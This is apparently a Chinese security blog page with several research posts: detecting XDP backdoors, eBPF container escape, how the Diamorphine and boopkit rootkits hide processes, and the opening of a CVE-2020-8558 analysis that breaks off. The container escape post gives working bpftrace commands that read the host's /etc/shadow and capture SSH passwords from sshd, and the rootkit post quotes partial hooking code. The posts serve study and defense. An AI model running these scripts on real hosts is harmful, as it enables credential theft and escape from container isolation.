<p>下面代码编译后的ebpf程序就会检查失败，出现上面的报错信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void mystrncpy(char *dest, const char *src, size_t count)</span><br><span class="line">&#123;</span><br><span class="line">      char *tmp &#x3D; dest;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; #pragma clang loop unroll(full)</span><br><span class="line">      while (count) &#123;</span><br><span class="line">              if ((*tmp &#x3D; *src) !&#x3D; 0)</span><br><span class="line">                      src++;</span><br><span class="line">              tmp++;</span><br><span class="line">              count--;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以尝试使用<code>#pragma clang loop unroll(full)</code>告诉编译器编译时对循环做展开，来解决这个报错问题。</p>
<blockquote>
<p>这个解决办法是在 <a target="_blank" rel="noopener" href="https://rexrock.github.io/post/ebpf1/">https://rexrock.github.io/post/ebpf1/</a> 文中看到的</p>
</blockquote>
<h1 id="检测：xdp后门的特征"><a href="#检测：xdp后门的特征" class="headerlink" title="检测：xdp后门的特征"></a>检测：xdp后门的特征</h1><p><code>bpftool prog</code>能看到xdp程序信息、<code>bpftool map</code>能看到xdp程序和应用程序通信用到的map信息</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185065176-b2115f0d-c22b-4f3f-84fc-d51f1877a2e4.png"></p>
<p>应用程序文件描述符中也有map id信息</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185066192-d61d9a39-f960-4ad0-893d-4d7871f349e9.png"></p>
<p>应用程序想要执行命令时也会有一些特征，比如demo中使用system执行系统命令时，会有fork系统调用。</p>
<p>应用程序如果想要将命令结果回传、或者反弹shell，主机上也能抓到这一部分流量。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>xdp概念、xdp编程的知识都在参考链接中，本文非常粗浅地分析一点xdp后门的优点和检测方式，希望能对你有点帮助。</p>
<p>在搞完这个demo后，我才发现有一个看起来很完善的xdp后门<a target="_blank" rel="noopener" href="https://github.com/h3xduck/TripleCross">TripleCross</a>。</p>
<p>在研究ebpf和主机安全中，还参考学习<a target="_blank" rel="noopener" href="https://www.cnxct.com/">美团工程师CFC4N博客</a>上的内容。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/" class="post-title-link" itemprop="url">基于ebpf的容器逃逸(上)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-29 19:17:09" itemprop="dateCreated datePublished" datetime="2022-07-29T19:17:09+08:00">2022-07-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-03 10:17:31" itemprop="dateModified" datetime="2022-08-03T10:17:31+08:00">2022-08-03</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 和 <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 都提到了基于ebpf的容器逃逸。</p>
<p>本文简要记录自己对这两篇文章的学习、复现，并给出一个demo，希望对主机安全有兴趣的读者有点帮助。</p>
<h1 id="快速验证”可以用ebpf在容器中读宿主机文件”"><a href="#快速验证”可以用ebpf在容器中读宿主机文件”" class="headerlink" title="快速验证”可以用ebpf在容器中读宿主机文件”"></a>快速验证”可以用ebpf在容器中读宿主机文件”</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 有一页PPT</p>
<p><img src="https://user-images.githubusercontent.com/1846319/182094230-dd1ca6f7-d970-417f-8d40-18739873e580.png"></p>
<p>你也可以输入以下命令，来复现上面”在容器中观测到宿主机文件内容”的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -it --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@6a6339858e9a:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@6a6339858e9a:&#x2F;# export BPFTRACE_STRLEN&#x3D;200       &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;iovisor&#x2F;bpftrace&#x2F;blob&#x2F;master&#x2F;docs&#x2F;reference_guide.md#91-bpftrace_strlen</span><br><span class="line">root@6a6339858e9a:&#x2F;# bpftrace -e &#39;kretfunc:vfs_read &#x2F;comm&#x3D;&#x3D;&quot;cat&quot;&#x2F; &#123;printf(&quot;%s,%d\n&quot;,str(uptr(args-&gt;buf),retval),retval);&#125;&#39;</span><br><span class="line">Attaching 1 probe...</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/181756031-d22cec4c-9456-4a8e-9b0b-94e0512b7db7.png"></p>
<blockquote>
<p>bpftrace可以参考<a target="_blank" rel="noopener" href="https://github.com/iovisor/bpftrace">官方文档</a></p>
</blockquote>
<p>上面是根据命令名来过滤，查看特定命令读取的文件内容。你也可以根据文件名来过滤。</p>
<p>比如输入以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# docker run -it -v &#x2F;tmp:&#x2F;tmp --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@b0e60d8c7219:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@b0e60d8c7219:&#x2F;# export BPFTRACE_STRLEN&#x3D;150</span><br><span class="line">root@b0e60d8c7219:&#x2F;# bpftrace &#x2F;tmp&#x2F;1.bt</span><br><span class="line">Attaching 9 probes...</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/182092087-d797efac-fc85-4b0b-b025-d13628f9eac9.png"></p>
<p>1.bt 代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Tracing file content... Hit Ctrl-C to end.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_open,</span><br><span class="line">tracepoint:syscalls:sys_enter_openat</span><br><span class="line">&#x2F; strncmp(str(args-&gt;filename), &quot;&#x2F;etc&#x2F;shadow&quot;, 11) &#x3D;&#x3D; 0 &#x2F;      &#x2F;&#x2F; 待观测的文件路径</span><br><span class="line">&#123;</span><br><span class="line">	@filename[tid] &#x3D; args-&gt;filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_open,</span><br><span class="line">tracepoint:syscalls:sys_exit_openat</span><br><span class="line">&#x2F;@filename[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	$ret &#x3D; args-&gt;ret;</span><br><span class="line">	$fd &#x3D; $ret &gt; 0 ? $ret : -1;</span><br><span class="line"></span><br><span class="line">  @fd_filenmae_map[tid, $fd] &#x3D; @filename[tid];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_read</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  @read_buf[tid] &#x3D; args-&gt;buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_read</span><br><span class="line">&#x2F;@read_buf[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;filename:%s, content:%s\n&quot;, str(@filename[tid]), str(uptr(@read_buf[tid])))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_close</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  delete(@filename[tid]);</span><br><span class="line">  delete(@fd_filenmae_map[tid, args-&gt;fd]);</span><br><span class="line">  delete(@read_buf[tid]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">END</span><br><span class="line">&#123;</span><br><span class="line">	clear(@filename);</span><br><span class="line">  clear(@fd_filenmae_map);</span><br><span class="line">  clear(@read_buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="验证”获取用户密码”"><a href="#验证”获取用户密码”" class="headerlink" title="验证”获取用户密码”"></a>验证”获取用户密码”</h1><p>sshd write系统调用中会有ssh密码信息，如下<br><img src="https://user-images.githubusercontent.com/1846319/182098510-d487a570-5c78-4620-ba82-87733a850f39.png"></p>
<p>所以，你可以在容器中用 ‘tracepoint:syscalls:sys_enter_write’ 来获取ssh密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bpftrace -e &#39;tracepoint:syscalls:sys_enter_write &#x2F;comm&#x3D;&#x3D;&quot;sshd&quot;&#x2F; &#123;</span><br><span class="line">  if (args-&gt;fd &#x3D;&#x3D; 6)&#123;</span><br><span class="line">    printf(&quot;%s\n&quot;,str(args-&gt;buf+4));  &#x2F;&#x2F; 前四个字节是0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/182009021-c0471216-1413-48a6-871d-43efaf3196b2.png"></p>
<blockquote>
<p>我测试的ssh是OpenSSH_8.0p1，可能你的ssh发行版和我不同，并不一定通过hook write系统调用来获取用户密码。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>基于ebpf做容器逃逸时，重点是需要知道hook哪个函数。</p>
<p>比如 <a target="_blank" rel="noopener" href="https://www.cnxct.com/container-escape-in-linux-kernel-space-by-ebpf">内核态eBPF程序实现容器逃逸与隐藏账号rootkit</a> 文章中是hook哪个函数呢？</p>
<p>另一个重点是”ebpf怎么修改数据”。前面的两个例子都只用bpftrace观测数据，而没有修改<code>args-&gt;buf</code>中的数据。</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 、 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EoiyhMIn6VpxWK92AZS_PQ">lkm和ebpf rootkit分析的简要记录</a> 的例子中都涉及到”ebpf修改数据”。</p>
<p>bpftrace目前只有<code>override()</code>能修改部分<code>kprobes</code>的返回值，所以下一篇我会用<code>libbpf</code>演示”ebpf修改数据能造成什么效果”。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-27-lkm%E5%92%8Cebpf%20rootkit%E5%88%86%E6%9E%90%E7%9A%84%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-27-lkm%E5%92%8Cebpf%20rootkit%E5%88%86%E6%9E%90%E7%9A%84%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">lkm和ebpf rootkit分析的简要记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-27 14:50:51" itemprop="dateCreated datePublished" datetime="2022-07-27T14:50:51+08:00">2022-07-27</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-07-31 17:23:05" itemprop="dateModified" datetime="2022-07-31T17:23:05+08:00">2022-07-31</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ZSxpeUHTcgQrQ1Ys5uROw">再次捕获云上在野容器攻击，TeamTNT黑产攻击方法揭秘</a> 文章中提到一个<a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">内核rootkit-Diamorphine</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnxct.com/ebpf-rootkit-how-boopkit-works/">新型eBPF后门boopkit的原理分析与演示</a> 也提到基于<a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">ebpf的rootkit</a></p>
<p>本文简要分析这两个rootkit在”进程隐藏”上实现的区别。</p>
<blockquote>
<p>特别因为是eBPF只能通过<a target="_blank" rel="noopener" href="https://ebpf.io/what-is-ebpf#helper-calls">“helper functions”</a>调用内核能力，而不能直接调用内核函数、修改内核数据结构，所以我好奇eBPF后门怎么实现”进程隐藏”。</p>
</blockquote>
<h1 id="lkm-rootkit是怎么隐藏进程的"><a href="#lkm-rootkit是怎么隐藏进程的" class="headerlink" title="lkm rootkit是怎么隐藏进程的"></a>lkm rootkit是怎么隐藏进程的</h1><p>通过修改<code>__sys_call_table</code>，hook了kill、getdents64系统调用。</p>
<p>用户在调用kill系统调用时，rootkit在收到信号”SIGMODINVIS”(头文件中可以看到是31)后，就会执行两步：</p>
<ul>
<li>for_each_process找到进程task_struct</li>
<li>修改task_struct的flags</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; diamorphine.c</span><br><span class="line">hacked_kill(pid_t pid, int sig)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">	struct task_struct *task;</span><br><span class="line">	switch (sig) &#123;</span><br><span class="line">		case SIGINVIS:</span><br><span class="line">			if ((task &#x3D; find_task(pid)) &#x3D;&#x3D; NULL) &#x2F;&#x2F; 根据pid找到task_struct实例</span><br><span class="line">				return -ESRCH;</span><br><span class="line">			task-&gt;flags ^&#x3D; PF_INVISIBLE;</span><br><span class="line">			break;</span><br></pre></td></tr></table></figure>

<p>用户在getdents64系统调用查看目录信息时，rootkit会修改返回给用户的目录信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,</span><br><span class="line">	unsigned int count)</span><br><span class="line">&#123;</span><br><span class="line">  int ret &#x3D; orig_getdents64(fd, dirent, count), err;  &#x2F;&#x2F; 调用原先的getdents64函数</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  kdirent &#x3D; kzalloc(ret, GFP_KERNEL);   &#x2F;&#x2F; 申请ret大小的内核内存</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	err &#x3D; copy_from_user(kdirent, dirent, ret);   &#x2F;&#x2F; 将&quot;目录信息&quot;复制一份</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	while (off &lt; ret) &#123;</span><br><span class="line">		dir &#x3D; (void *)kdirent + off;</span><br><span class="line">		if ((!proc &amp;&amp;</span><br><span class="line">		(memcmp(MAGIC_PREFIX, dir-&gt;d_name, strlen(MAGIC_PREFIX)) &#x3D;&#x3D; 0))   &#x2F;&#x2F; 文件以MAGIC_PREFIX开头</span><br><span class="line">		|| (proc &amp;&amp;</span><br><span class="line">		is_invisible(simple_strtoul(dir-&gt;d_name, NULL, 10)))) &#123; &#x2F;&#x2F; &#x2F;proc&#x2F;$&#123;pid&#125; 被标记成需要隐藏</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  err &#x3D; copy_to_user(dirent, kdirent, ret);   &#x2F;&#x2F; 将修改后的&quot;目录信息&quot;复制给用户</span><br></pre></td></tr></table></figure>


<p>测试后，就会发现rootkit会影响<code>/proc</code>目录中是否可以看到进程目录。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/181194318-b17ebd7f-3ac1-4f3f-8977-4fafb2e2bdcf.png" alt="image"></p>
<p>实际上是rootkit影响了getdents64系统调用的结果<br><img src="https://user-images.githubusercontent.com/1846319/181200677-1e2775a9-cc60-45fb-8295-1e3606ba7aaf.png" alt="image"></p>
<p>ps命令也是读<code>/proc</code>目录来获取进程信息的，所以rootkit影响ps命令结果<br><img src="https://user-images.githubusercontent.com/1846319/181199847-6750c019-74f6-41b5-a7f9-b20113093bd3.png" alt="image"></p>
<p>所以这个lkm rootkit是通过修改task_struct的flags字段来给进程打个标记，等getdents64时会根据标记判断是不是要修改目录信息。</p>
<p>eBPF程序不能直接修改内核数据，那eBPF后门是怎么做”进程隐藏”的呢？</p>
<h1 id="ebpf-rootkit是怎么隐藏进程的"><a href="#ebpf-rootkit是怎么隐藏进程的" class="headerlink" title="ebpf rootkit是怎么隐藏进程的"></a>ebpf rootkit是怎么隐藏进程的</h1><p>getdents64系统调用可以用来获取目录信息，<code>man 2 getdents</code>可以知道第二个指针参数指向”目录条目”buffer</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int getdents64(unsigned int fd, struct linux_dirent64 *dirp,</span><br><span class="line">             unsigned int count);</span><br></pre></td></tr></table></figure>

<p>“目录条目”数据结构如下，因为有”柔性数组”，所以用d_reclen记录了大小，这样就可以在”目录条目”buffer中定位到下一个”目录条目”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct linux_dirent64 &#123;</span><br><span class="line">    ino64_t        d_ino;    &#x2F;* 64-bit inode number *&#x2F;</span><br><span class="line">    off64_t        d_off;    &#x2F;* 64-bit offset to next structure *&#x2F;</span><br><span class="line">    unsigned short d_reclen; &#x2F;* Size of this dirent *&#x2F;  当前&quot;目录条目&quot;的大小</span><br><span class="line">    unsigned char  d_type;   &#x2F;* File type *&#x2F;</span><br><span class="line">    char           d_name[]; &#x2F;* Filename (null-terminated) *&#x2F; 柔性数组</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>pr0be.safe.c 注释写得很清楚，通过增大”目标进程所属的目录条目的前一个目录条目”的d_reclen值，使得用户程序在遍历<code>*dirp</code>结果时，就会跳过”目标进程所属的目录条目”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SEC(&quot;tp&#x2F;syscalls&#x2F;sys_exit_getdents64&quot;)</span><br><span class="line">int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; Unlink target, by reading in previous linux_dirent64 struct,</span><br><span class="line">  &#x2F;&#x2F; and setting it&#39;s d_reclen to cover itself and our target.</span><br><span class="line">  &#x2F;&#x2F; This will make the program skip over our folder.</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; Attempt to overwrite</span><br><span class="line">  short unsigned int d_reclen_new &#x3D; d_reclen_previous + d_reclen;</span><br><span class="line">  long ret &#x3D; bpf_probe_write_user(&amp;dirp_previous-&gt;d_reclen, &amp;d_reclen_new,</span><br><span class="line">                                  sizeof(d_reclen_new));</span><br></pre></td></tr></table></figure>

<p>因为<code>&amp;dirp_previous-&gt;d_reclen</code>是用户空间地址，而不是内核空间地址，所以ebpf可以用<code>bpf_probe_write_user</code> helper functions 修改<code>dirp</code>地址中的数据。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>案例中的lkm rootkit和ebpf rootkit都是通过修改getdents64系统调用中<code>dirp</code>地址指向的内容，使得查看<code>/proc</code>目录信息时，看不到进程信息。</p>
<p>根据<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/43003805/can-ebpf-modify-the-return-value-or-parameters-of-a-syscall">帖子</a>知道，想利用ebpf修改系统调用的参数值或返回值有很大的限制。因为dirp是一个用户空间地址，所以ebpf程序可以用<code>bpf_probe_write_user</code>修改此地址的内容。</p>
<!--
# 参考
https://man7.org/linux/man-pages/man7/bpf-helpers.7.html

# 特征

都用到 bpf_probe_write_user
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-11-CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127.0.0.1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-11-CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127.0.0.1/" class="post-title-link" itemprop="url">CVE-2020-8558-跨主机访问127.0.0.1</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-11 16:47:13" itemprop="dateCreated datePublished" datetime="2022-07-11T16:47:13+08:00">2022-07-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-07-20 11:23:51" itemprop="dateModified" datetime="2022-07-20T11:23:51+08:00">2022-07-20</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>假设机器A和机器B在同一个局域网，机器A使用<code>nc -l 127.0.0.1 8888</code>，在机器B上可以访问机器A上”仅绑定在127.0.0.1的服务”吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# nc -l 127.0.0.1 8888 &amp;</span><br><span class="line">[1] 44283</span><br><span class="line">[root@instance-h9w7mlyv ~]# netstat -antp|grep 8888</span><br><span class="line">tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      44283&#x2F;nc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nc用法可能不同，有的使用 nc -l 127.0.0.1 -p 8888 监听8888端口</p>
</blockquote>
<p>kubernetes的kube-proxy组件之前披露过CVE-2020-8558漏洞，这个漏洞就可以让”容器内的恶意用户、同一局域网其他机器”访问到node节点上”仅绑定在127.0.0.1的服务”。这样有可能访问到监听在本地的”kubernetes无需认证的apiserver”，进而控制集群。</p>
<p>本文会带你做两种网络环境(vpc和docker网桥模式)下的漏洞原理分析，并复现漏洞。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="怎么复现？"><a href="#怎么复现？" class="headerlink" title="怎么复现？"></a>怎么复现？</h2><p>先说最终结果，我已经做好基于<a target="_blank" rel="noopener" href="https://www.terraform.io/">terraform</a>的<a target="_blank" rel="noopener" href="https://github.com/HuoCorp/TerraformGoat/blob/main/kubernetes/kube-proxy/CVE-2020-8558/README_CN.md">漏洞靶场</a>。</p>
<blockquote>
<p>terraform可以基于声明式api编排云上的基础设施(虚拟机、网络等)</p>
</blockquote>
<p>你也可以按照文章后面的步骤来复现漏洞。</p>
<h2 id="为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？"><a href="#为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？" class="headerlink" title="为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？"></a>为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？</h2><p>假设实验环境是，一个局域网内有两个节点A和B、交换机，ip地址分别是ip_a和ip_b，mac地址分别是mac_a和mac_b。</p>
<p>来看看A机器访问B机器时的一个攻击场景。</p>
<p>如果在tcp握手时，A机器构造一个”恶意的syn包”，数据包信息是：</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>源mac</th>
<th>目的ip</th>
<th>目的mac</th>
<th>目的端口</th>
<th>源端口</th>
</tr>
</thead>
<tbody><tr>
<td>ip_a</td>
<td>mac_a</td>
<td>127.0.0.1</td>
<td>mac_b</td>
<td>8888</td>
<td>44444(某个随机端口)</td>
</tr>
</tbody></table>
<p>此时如果交换机只是根据mac地址做数据转发，它就将syn包发送给B。</p>
<p>syn包的数据流向是：A -&gt; 交换机 -&gt; B</p>
<p>B机器网卡在接收到syn包后：</p>
<ul>
<li>链路层：发现目的mac是自己，于是扔给网络层处理</li>
<li>网络层：发现ip是本机网卡ip，看来要给传输层处理，而不是转发</li>
